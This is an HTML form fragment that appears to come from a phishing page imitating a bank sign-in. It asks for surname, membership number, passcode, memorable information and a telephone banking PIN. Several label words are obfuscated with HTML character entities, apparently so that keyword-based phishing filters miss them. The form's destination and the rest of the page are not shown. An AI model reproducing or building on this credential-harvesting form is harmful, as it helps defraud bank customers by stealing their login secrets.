<br>
<form>
	<table width="100%">
		<tr>
			<td width="30%">Surname</td>
			<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
			<td>
				<div class="textInput">
					<div class="fieldWrapper">
						<input type="text"  autocomplete="off" maxlength="20"  name="s_name" value="" required="required" title="Surname">
					</div>
				</div>
			</td>
		</tr>
		<tr>
			<td width="30%">Membership 	&#78;umber</td>
			<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
			<td>
				<div class="textInput">
					<div class="fieldWrapper">
						<input type="number"  autocomplete="off" maxlength="20" name="m_num" value="" required="required" title="Membership Number">
					</div>
				</div>
			</td>
		</tr>
		<tr>
			<td width="30%">Pas&#115;code</td>
			<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
			<td>
				<div class="textInput">
					<div class="fieldWrapper">
						<input type="text"  autocomplete="off" maxlength="20" name="pscode" value="" required="required" title="Passcode">
					</div>
				</div>
			</td>
		</tr>
		<tr>
			<td width="30%">&#77;emorable</td>
			<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
			<td>
				<div class="textInput">
					<div class="fieldWrapper">
						<input type="text"  autocomplete="off"  maxlength="20" name="m_able" value="" required="required" title="Memorable">
					</div>
				</div>
			</td>
		</tr>
		<tr>
			<tr>
				<td width="30%">Telephone &#x0042;anking &#x0050;in</td>
				<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
				<td>
					<div class="textInput">
						<div class="fieldWrapper">
							<input type="password"  autocomplete="off"  maxlength="10" id="txt" onkeyup="check()" onmouseout="check()" name="tpin" value="" required="" title="Telephone">
						</div>
					</div>
				</td>
			</tr>
		</table>
	</form>